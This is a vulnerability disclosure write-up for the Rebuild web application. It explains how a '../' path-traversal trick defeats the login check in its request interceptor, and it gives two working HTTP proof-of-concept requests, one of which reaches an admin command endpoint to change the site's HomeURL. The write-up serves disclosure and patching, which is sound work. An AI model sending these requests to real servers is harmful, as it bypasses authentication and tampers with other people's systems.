# There is an Incorrect Access Control vulnerability in rebuild

- Codebase: https://github.com/getrebuild/rebuild/
- Affected version
  - Rebuild ≤ 3.7.5, fixed in 3.7.6

1. The affected source code class is `com.rebuild.web.RebuildWebInterceptor` , and the affected function is `preHandle` In the filter code, use `servletRequest.getRequestURI()` to obtain the request path, and then determine whether the path contains `/user/` and do not contain `/user/admin` . If so, execute `return true` to skip this Interceptor. Else, redirect to `/user/login api`.
	![image-20240902141807728](img/image-20240902141807728.png)	
    ![image-20240902141825997](img/image-20240902141825997.png)
    ![image-20240902141840798](img/image-20240902141840798.png)

2. The problem lies in using `servletRequest.getRequestURI()` to obtain the request path. The path obtained by this function will not parse special symbols, but will be passed on directly, so you can use `../` to bypass it.

   The prerequisite for the vulnerability exploitation is that the `server.servlet.context-path` configuration is non-empty. Here, it is exemplified with `/demo` . Taking one of the backend interfaces `/commons/ip-location` as an example(full path in case is `/demo/commons/ip-location` ), using `/user/../demo/commons/ip-location` can make it satisfy `requestUri.contains("/user/" )` condition, and at the same time, it can request the `ip-location` interface to achieve login bypass.
   ![image-20240902141858316](img/image-20240902141858316.png)	
   ![image-20240902141936427](img/image-20240902141936427.png)

3. POC

   ```
   GET /user/../demo/commons/ip-location?ip=www.baidu.com HTTP/1.1
   Host: localhost:18080
   User-Agent: Apifox/1.0.0 (<https://apifox.com>)
   Accept: */*
   Host: localhost:18080
   Connection: keep-alive
   ```

   Other case like api: `/admin/admin-cli/exec` can do some setting, like POC below can change the HomeURL of rebuild

   ```
   POST /user/../demo/admin/admin-cli/exec HTTP/1.1
   Host: localhost:18080
   User-Agent: Apifox/1.0.0 (https:!#apifox.com)
   Content-Type: text/plain
   Accept: */*
   Host: localhost:18080
   Connection: keep-alive
   syscfg HomeURL <https://hacked.by.racerz>
   ```
   ![image-20240902141953777](img/image-20240902141953777.png)